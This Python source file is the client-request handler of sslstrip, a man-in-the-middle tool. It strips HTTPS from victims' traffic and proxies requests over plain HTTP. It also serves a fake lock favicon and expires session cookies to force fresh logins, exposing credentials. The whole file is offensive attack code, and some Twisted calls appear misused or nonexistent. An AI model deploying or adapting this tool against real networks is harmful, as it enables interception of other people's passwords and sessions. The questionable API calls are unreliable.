import logging
import os

from twisted.internet import defer, reactor, ssl
from twisted.internet.endpoints import HostnameEndpoint
from twisted.names import client as dns_client
from twisted.web.http import Request

from sslstrip.CookieCleaner import CookieCleaner
from sslstrip.DnsCache import DnsCache
from sslstrip.ServerConnection import ServerConnection
from sslstrip.ServerConnectionFactory import ServerConnectionFactory
from sslstrip.SSLServerConnection import SSLServerConnection
from sslstrip.URLMonitor import URLMonitor


class ClientRequest(Request):
    """This class represents incoming client requests and is essentially where
    the magic begins.  Here we remove the client headers we don't like, and then
    respond with either favicon spoofing, session denial, or proxy through HTTP
    or SSL to the server.
    """

    def __init__(self, channel, queued, reactor=reactor):
        Request.__init__(self, channel, queued)
        self.reactor = reactor
        self.urlMonitor = URLMonitor.get_instance()
        self.cookieCleaner = CookieCleaner.getInstance()
        self.dnsCache = DnsCache.getInstance()
        self.resolver = dns_client.createResolver()

    def cleanHeaders(self):
        headers_to_remove = ['accept-encoding', 'if-modified-since', 'cache-control']
        headers = {k: v for k, v in self.getAllHeaders().items() if k not in headers_to_remove}
        return headers

    def getPathFromUri(self):
        return self.uri[7:] if self.uri.startswith('http://') else self.uri

    def getPathToLockIcon(self):
        paths = ['lock.ico', '../share/sslstrip/lock.ico']
        for path in paths:
            if os.path.exists(path):
                return path
        logging.warning('Error: Could not find lock.ico')
        return 'lock.ico'

    def handleHostResolved(self, result, error=None):
        if error:
            logging.warning(f'Host resolution error: {error!s}')
            self.finish()
            return

        if not result or not result[0]:
            logging.warning(f'Could not resolve host: {self.getHeader("host")}')
            self.finish()
            return

        address = result[0][0].payload.address
        logging.debug(f'Resolved host successfully: {self.getHeader("host")} -> {address}')
        host = self.getHeader('host')
        headers = self.cleanHeaders()
        client = self.getClientIP()
        path = self.getPathFromUri()

        self.content.seek(0, 0)
        postData = self.content.read()
        url = 'http://' + host + path

        self.dnsCache.cacheResolution(host, address)

        if not self.cookieCleaner.isClean(self.method, client, host, headers):
            logging.debug('Sending expired cookies...')
            self.sendExpiredCookies(
                host,
                path,
                self.cookieCleaner.getExpireHeaders(self.method, client, host, headers, path),
            )
        elif self.urlMonitor.is_secure_favicon(client, path):
            logging.debug('Sending spoofed favicon response...')
            self.sendSpoofedFaviconResponse()
        elif self.urlMonitor.is_secure_link(client, url):
            logging.debug('Sending request via SSL...')
            self.proxyRequest(
                address,
                self.method,
                path,
                postData,
                headers,
                self.urlMonitor.get_secure_port(client, url),
                is_ssl=True,
            )
        else:
            logging.debug('Sending request via HTTP...')
            self.proxyRequest(address, self.method, path, postData, headers, is_ssl=False)

    def resolveHost(self, host):
        address = self.dnsCache.getCachedAddress(host)
        logging.debug('Host cached.' if address else 'Host not cached.')
        if address:
            return defer.succeed([(dns_client.Record_A(address),)])
        else:
            return self.resolver.lookupAddress(host)

    def process(self):
        logging.debug(f'Resolving host: {self.getHeader("host")}')
        host = self.getHeader('host')
        deferred = self.resolveHost(host)
        deferred.addCallback(self.handleHostResolved)
        deferred.addErrback(lambda err: self.handleHostResolved(None, err))

    def proxyRequest(self, host, method, path, postData, headers, port=80, is_ssl=False):
        connectionFactory = ServerConnectionFactory(method, path, postData, headers, self)
        connectionFactory.protocol = SSLServerConnection if is_ssl else ServerConnection

        if is_ssl:
            ctx = ssl.optionsForClientTLS(self.getHeader('host'))
            endpoint = HostnameEndpoint(self.reactor, host, port)
            endpoint = ssl.ClientTLSOptions(host, ctx).wrapClientTLS(endpoint)
        else:
            endpoint = HostnameEndpoint(self.reactor, host, port)

        d = endpoint.connect(connectionFactory)
        d.addErrback(lambda err: logging.error(f'Connection error: {err}'))

    def sendExpiredCookies(self, host, path, expireHeaders):
        self.setResponseCode(302)
        self.setHeader('Connection', 'close')
        self.setHeader('Location', 'http://' + host + path)

        for header in expireHeaders:
            self.setHeader('Set-Cookie', header)

        self.finish()

    def sendSpoofedFaviconResponse(self):
        try:
            with open(self.getPathToLockIcon(), 'rb') as icoFile:
                self.setResponseCode(200)
                self.setHeader('Content-type', 'image/x-icon')
                self.write(icoFile.read())
        except OSError:
            logging.warning("File error: Couldn't open or read the file")
        self.finish()
